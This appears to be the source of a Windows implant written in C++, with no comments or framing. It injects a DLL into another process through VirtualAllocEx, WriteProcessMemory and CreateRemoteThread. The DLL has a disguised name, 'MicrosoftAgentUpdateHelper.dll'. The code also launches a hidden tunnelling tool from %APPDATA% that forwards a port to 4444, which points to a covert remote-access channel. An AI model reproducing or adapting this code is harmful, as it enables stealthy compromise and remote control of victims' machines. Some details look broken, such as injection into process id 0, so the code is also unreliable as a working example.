

#include <windows.h>
#include <string>
#include <map>





typedef struct { void *init; void *exec; void *cleanup; } FeatureApi;
typedef FeatureApi *(*GetFeatureApiFn)();
static std::map<std::string, FeatureApi *> g_features;

bool load_feature(const std::string &name, const char *tmp_dll) {
    HMODULE h = LoadLibraryA(tmp_dll);
    if (!h) return false;
    GetFeatureApiFn get = (GetFeatureApiFn)GetProcAddress(h, "GetFeatureApi");
    if (!get) return false;
    g_features[name] = get();
    return true;
}





bool map_library(DWORD pid, const char *dll_path) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return false;
    SIZE_T n = strlen(dll_path) + 1;
    LPVOID remote = VirtualAllocEx(hProc, NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remote, dll_path, n, NULL);
    LPTHREAD_START_ROUTINE ll =
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, ll, remote, 0, NULL);
    if (!hThread) return false;
    WaitForSingleObject(hThread, INFINITE);
    return true;
}






void forward_peer(const char *tc_addr) {
    char roaming[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\TailscalePortable\\tailcat.exe", roaming, MAX_PATH);
    std::string cmd = std::string("\"") + roaming + "\" forward " + tc_addr + " 18080:4444";
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                   0, NULL, NULL, &si, &pi);
}

int main() {
    
    CreateMutexA(NULL, FALSE, "Local\\WorkerAgentInstance");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    char dll[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\MicrosoftAgentUpdateHelper.dll", dll, MAX_PATH);
    
    map_library(0, dll);
    forward_peer("tc111111111111111111111111111111111111111111111111111111111111");
    return 0;
}
